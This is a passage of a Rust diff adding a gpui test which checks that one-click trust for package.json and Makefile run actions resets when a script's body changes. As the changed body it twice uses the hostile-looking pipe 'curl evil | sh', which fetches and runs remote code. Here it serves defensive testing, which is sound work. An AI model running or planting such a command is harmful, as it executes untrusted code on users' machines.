+                    )),
+                    "{:?}",
+                    review.state.tabs
+                );
+            })
+            .unwrap();
+    }
+
+    #[gpui::test]
+    fn changing_a_script_body_resets_one_click_trust(cx: &mut gpui::TestAppContext) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        let package = |body: &str| format!(r#"{{ "scripts": {{ "dev": "{body}" }} }}"#);
+        write(root, "package.json", &package("vite"));
+        write(root, "Makefile", "build:\n\techo one\n");
+        let (window, _, active) = crate::shell::tests::window(cx);
+        let count = |shell: &Shell| {
+            shell
+                .terminals
+                .get(&shell.workspace.project)
+                .map_or(0, Vec::len)
+        };
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                shell.refresh_actions(cx);
+                shell.run_actions_menu("run:package.json:dev", window, cx);
+                assert_eq!(count(shell), 1);
+                assert!(shell.footer_action().is_some());
+            })
+            .unwrap();
+        // The same bytes written again: still trusted.
+        write(root, "package.json", &package("vite"));
+        window
+            .update(cx, |shell, window, cx| {
+                shell.run_footer_action(window, cx);
+                assert_eq!(count(shell), 2);
+                assert!(!shell.menu_open(&MenuTarget::Actions));
+            })
+            .unwrap();
+        // The script's body changes but `bun run dev` doesn't: one click no
+        // longer runs it.
+        write(root, "package.json", &package("curl evil | sh"));
+        window
+            .update(cx, |shell, window, cx| {
+                let command = shell.footer_action().map(|a| a.command.clone());
+                shell.run_footer_action(window, cx);
+                assert!(shell.menu_open(&MenuTarget::Actions));
+                assert_eq!(count(shell), 2);
+                assert!(shell.footer_action().is_none());
+                let dev = shell
+                    .listing(cx)
+                    .actions
+                    .into_iter()
+                    .find(|a| a.id == "package.json:dev");
+                assert_eq!(dev.map(|a| a.command), command);
+                shell.close_menu(cx);
+
+                // Same for a Makefile recipe.
+                shell.run_actions_menu("run:make:build", window, cx);
+                assert_eq!(count(shell), 3);
+                assert!(shell.footer_action().is_some());
+            })
+            .unwrap();
+        write(root, "Makefile", "build:\n\tcurl evil | sh\n");
+        window
+            .update(cx, |shell, window, cx| {
+                shell.run_footer_action(window, cx);
+                assert!(shell.menu_open(&MenuTarget::Actions));
+                assert_eq!(count(shell), 3);
+            })
+            .unwrap();
     }
 }
